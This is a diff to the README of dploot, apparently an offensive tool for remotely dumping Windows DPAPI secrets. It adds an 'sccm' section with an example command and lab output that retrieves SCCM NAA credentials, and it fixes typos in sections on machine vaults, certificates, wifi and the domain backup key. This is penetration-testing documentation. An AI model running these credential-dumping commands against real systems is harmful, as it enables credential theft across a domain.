@@ -32,6 +32,7 @@ If you don't know what is DPAPI, [check out this post](https://posts.specterops.
       - [machinetriage](#machinetriage)
     - [Misc](#misc)
       - [wifi](#wifi)
+      - [sccm](#sccm)
       - [backupkey](#backupkey)
   - [Credits](#credits)
   - [TODO](#TODO)
@@ -544,7 +545,7 @@ Unknown     : Password!123
 The **machinevaults** command will get any machine Vaults file found and decrypt them with `-mkfile FILE` of one or more {GUID}:SHA1, otherwise dploot will dump DPAPI_SYSTEM LSA secret key in order to decrypt any machine masterkeys, and then decrypt any found encrypted DPAPI Vaults blob.
 
 ```text
-$ dploot machinevaults -d waza.local -u jsmith -p 'Password#123' 192.168.56.14 -debug
+$ dploot machinevaults -d waza.local -u jsmith -p 'Password#123' 192.168.56.14
 [*] Connected to 192.168.56.14 as waza.local\jsmith (admin)
 
 [*] Triage SYSTEM masterkeys
@@ -563,7 +564,7 @@ Key2: 0x1514dd2c8f278ac517cf1ae09255aeaff62219a019bc21ac35321c040064b0b5
 
 ### machinecertificates
 
-The **machinecertificates** command will get any machine private key file found and decrypt them with `-mkfile FILE` of one or more {GUID}:SHA1, otherwise dploot willdump DPAPI_SYSTEM LSA secret key. in order to decrypt any machine masterkeys, and then decrypt any found encrypted DPAPI private key blob.
+The **machinecertificates** command will get any machine private key file found and decrypt them with `-mkfile FILE` of one or more {GUID}:SHA1, otherwise dploot will dump DPAPI_SYSTEM LSA secret key. in order to decrypt any machine masterkeys, and then decrypt any found encrypted DPAPI private key blob.
 
 It will also dump machine CAPI certificates blob with RemoteRegistry.
 
@@ -613,7 +614,7 @@ The machinetriage command runs the [machinecredentials](#machinecredentials), [m
 
 #### wifi
 
-The **wifi** command will get any wifi xml configuration file file and decrypt them with `-mkfile FILE` of one or more {GUID}:SHA1, otherwise dploot willdump DPAPI_SYSTEM LSA secret key. in order to decrypt any machine masterkeys, and then decrypt any found encrypted DPAPI private key blob.
+The **wifi** command will get any wifi xml configuration file  and decrypt them with `-mkfile FILE` of one or more {GUID}:SHA1, otherwise dploot will dump DPAPI_SYSTEM LSA secret key. in order to decrypt any machine masterkeys, and then decrypt any found encrypted DPAPI private key blob.
 
 ```text
 $ dploot wifi -d waza.local -u Administrator -p 'Password!123' 192.168.57.5
@@ -665,9 +666,33 @@ EapHostConfig:
 [snip]
 ```
 
+#### sccm
+
+The **sccm** command will retrieve NAA credentials, collection variables and tasks sequences credentials from the remote target and decrypt them with `-mkfile FILE` of one or more {GUID}:SHA1, otherwise dploot will dump DPAPI_SYSTEM LSA secret key. in order to decrypt any machine masterkeys, and then decrypt any found encrypted DPAPI private key blob. Using `-wmi` will dump SCCM secrets from WMI requests results.
+
+```text
+$ dploot sccm -d waza.local -u jsmith -p 'Password#123' 192.168.56.14
+[*] Connected to 192.168.56.14 as waza.local\jsmith (admin)
+
+[*] Triage SYSTEM masterkeys
+
+{c1027a5b-0dcc-4237-af05-19839a94c12f}:fda0c774f6a8ff189ef2759a151f2c6bcf6a4d46
+{e1a73282-709b-4717-ace0-00eecb280fcc}:cdb4c86722b50cecf87cf683c6d727f36d760dba
+{6fbe7c89-9810-4ce3-b841-f0f1dd8b46e6}:1fb57eb358ea26c617d39ce04c5feb613ab10b89
+{750630e8-b603-4d43-941e-6f756073e511}:f9fd650d02a09e92069c54465455feeea12f0049
+
+[*] Triage SCCM Secrets
+
+[NAA Account]
+Username: NAAAccount
+Password: Password!123
+
+[snip]
+```
+
 #### backupkey
 
-The **backupkey** command will retrieve the domaain DPAPI backup key from a domain controller using [MS-LDAD](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-lsad/1b5471ef-4c33-4a91-b079-dfcbb82f05cc). This key never changes and can decrypt any domain user DPAPI protected secret. Domain Admin privileges are required.
+The **backupkey** command will retrieve the domain DPAPI backup key from a domain controller using [MS-LDAD](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-lsad/1b5471ef-4c33-4a91-b079-dfcbb82f05cc). This key never changes and can decrypt any domain user DPAPI protected secret. Domain Admin privileges are required.
 
 By default, this command will write the domain backup key into a file called key.pvk, but you can change this with `outputfile` flag. It is also possible to dump legacy backup key with `legacy` flag.
 
